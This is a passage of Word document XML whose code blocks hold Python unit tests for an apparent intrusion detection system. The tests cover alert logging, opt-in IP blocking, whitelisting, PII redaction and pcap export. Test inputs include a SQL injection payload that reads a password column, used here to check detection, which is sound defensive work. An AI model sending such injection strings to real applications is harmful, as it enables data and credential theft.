          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D98D99" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F1A0D8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TestDispatcherFanOut(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35860A4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"""One dispatch call must reach every configured sink exactly once."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72450089" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C32713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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162D54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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6410457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self.config = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4697B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self.config.log_file = os.path.join(self.tmp, "alerts.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323710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self.logger = logger_mod.Logger(self.config.log_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056E165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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5BB3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self.defense = _RecordingDefense()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3802935D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55DC2A7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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A56866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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646EEF76" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EE57E2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_dispatcher(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152644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dispatcher_mod.AlertDispatcher(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782F74B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self.config, logger=self.logger, defense=self.defense)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9C8B68" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="439CFE3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test_alert_written_with_all_fr4_columns(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D1008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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050E53F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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B846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src_ip="192.0.2.5", confidence=0.97,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6586F42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payload=b"id=1 UNION SELECT pw FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055068A3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78CAF6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import csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5028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open(self.config.log_file, newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273AF75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rows = list(csv.DictReader(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C30033A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78F87F2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self.assertEqual(len(rows), 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703275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row = rows[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACBC4B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column in ("Timestamp", "Source IP", "Engine", "Verdict",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5645CEE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"Severity", "Risk Score", "Confidence",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1E955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"ATT&amp;CK Technique", "Payload Excerpt"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6354BB6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self.assertIn(column, row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A6DF4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self.assertEqual(row["Source IP"], "192.0.2.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D04D6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self.assertIn("T1190", row["ATT&amp;CK Technique"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623570F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self.assertTrue(float(row["Risk Score"]) &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373C38DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5E041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test_blocking_disabled_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCF109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NFR-3: active defence must be opt-in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBB3EF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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096BCE6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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", src_ip="10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DAB15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self.assertEqual(self.defense.blocked, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD33C76" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21C3687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test_blocking_when_enabled(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608C535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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0266C2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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B536A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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", src_ip="10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2BB31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self.assertEqual(self.defense.blocked, ["10.0.0.5"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49823A3E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="240141E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test_response_status_says_flagged_when_blocking_is_disabled(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4A0B8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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A9980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d.dispatch("BLACKLISTED IP DETECTED: 10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233B32A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kind="blacklist", src_ip="10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3112AA7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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3421D4B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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E97F1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body = f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BE5C3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self.assertIn("(Flagged)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E3A9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self.assertNotIn("(Blocked)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF5194C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ED868E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test_response_status_says_blocked_only_after_success(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3E30A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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDD475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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2707AC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meta = d.dispatch("BLACKLISTED IP DETECTED: 10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7B262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kind="blacklist", src_ip="10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B738F4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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4D041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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A2CA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body = f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342C9EE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self.assertTrue(meta["blocked"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED88DC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self.assertIn("(Blocked)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C51724" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58158A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test_every_engine_kind_can_trigger_a_block(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7CD80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Any engine may request a block when blocking is enabled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4978C15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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389EDC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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417B6B6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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D37F5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("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", "10.0.0.1"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACA21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("PORT SCAN DETECTED! (Unique Ports: 90/sec)", "10.0.0.2"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67668D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("MALICIOUS PAYLOAD! Keywords: ['UNION']", "10.0.0.3"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64416BE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("BLACKLISTED IP DETECTED: 10.0.0.4 (Flagged)", "10.0.0.4"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD658B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61704E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message, ip in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C230A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d.dispatch(message, src_ip=ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276027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self.assertEqual(self.defense.blocked,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED8BC8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["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC5957B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="760474F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test_whitelisted_ip_is_never_blocked(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2408D79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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02429E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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C4CA1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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288A807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src_ip="127.0.0.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646E71F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self.assertEqual(self.defense.blocked, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C165DA0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0112C7F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test_duplicate_block_inserted_once(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488E773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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8172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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D228E2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_ in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B4D7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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BECE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src_ip="10.0.0.9")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000916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self.assertEqual(self.defense.blocked, ["10.0.0.9"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C27823" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A87CD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test_duplicate_alert_is_published_once(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DCE54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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2355E0C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_ in range(2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309D7E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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FB61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src_ip="192.0.2.55", confidence=0.95)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD151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self.assertEqual(d.total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B278CA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self.assertEqual(self.logger.rows_written, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274C7CB3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C58AD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test_pii_is_redacted_before_persistence(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F8827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NFR-3 / DPA 2018: credentials must not reach the audit log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B312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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CF684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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E150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src_ip="192.0.2.9", confidence=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D55D1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payload=b"user=bob@example.com&amp;password=hunter2&amp;id=1 UNION")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19625D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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB679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body = f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C644F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self.assertNotIn("bob@example.com", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4DCEF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self.assertNotIn("hunter2", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670A7AC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self.assertIn("REDACTED", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181601FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F56EF86" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="652FAC6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TestPacketStoreToPcap(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F5417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"""The in-memory buffer must serialise to a file Wireshark can read."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDD0A23" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39DA921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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112371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self.store = packet_store.PacketStore(maxlen=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B67F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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F42A2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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6F735F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30A9D0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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC34C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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48628A94" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="076B2C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test_buffer_exports_as_readable_pcap(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A66B4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frames = [parser_mod.build_tcp(sport=5000 + i, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6ED9C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data=b"GET / HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A4EC8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 in range(6)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7913A7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frames.append(parser_mod.build_udp(data=b"dns"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020CCD6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frames.append(parser_mod.build_icmp())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40300F54" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC8E47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frame in frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF220C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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E0EAF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self.store.add({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A373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"ts": 1700000000.5, "time": "12:00:00",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA055C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 pkt["src"], "dst": pkt["dst"], "proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6807762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"sport": pkt["sport"], "dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014BAA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"length": pkt["length"], "info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE17A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 "clean", "hex": frame.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B175F0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0AA4FAA4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7630256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data = pcap.build_from_records(self.store.all_packets())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30184A6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path = os.path.join(self.tmp, "out.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEBCEE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open(path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276D3A3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f.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245E9EE8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D02DE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reader = pcap.PcapReader(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52278B7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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521E44C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recovered = list(reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E41330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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564F57E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CEB1F6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self.assertEqual(len(recovered), len(frames))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2320123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every recovered frame must decode back to the same 5-tuple</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206704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(_ts, raw, _orig), original in zip(recovered, frames):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1D96C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self.assertEqual(raw, original)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292F2E9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self.assertIsNotNone(parser_mod.PacketParser().parse(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121AEA7D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DA287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test_ring_buffer_is_bounded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F359F1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 in range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5724B1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self.store.add({"ts": 0, "src": "1.1.1.1", "proto": "TCP",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AA65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"length": 60, "hex": "00"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FBDE7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self.assertEqual(self.store.stats_snapshot()["buffered"], 50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9218E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self.assertEqual(self.store.stats_snapshot()["total_seen"], 200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D22D0F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12177BCF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29F562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TestIntervalSourceAttribution(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C2731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"""Aggregate alerts may name a source only when dominance is defensible."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC610CC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C7F3AF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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38064C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self.sensor = sensor_mod.SensorNode.__new__(sensor_mod.SensorNode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B6A52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self.sensor.config = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEB0C95" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D4E7F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test_dominant_source_is_attributed_above_threshold(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5771D36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stats = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C768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"192.0.2.10": {"packets": 80, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FA903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"192.0.2.20": {"packets": 20, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177C950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216E2D1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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC3EB3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self.sensor._dominant_source(stats, 100), "192.0.2.10")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6923C1D2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BCF86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test_distributed_traffic_is_not_attributed_or_blockable(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0367EE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stats = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452E38A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"192.0.2.10": {"packets": 40, "ports": set()},</w:t>
      </w:r>
    </w:p>
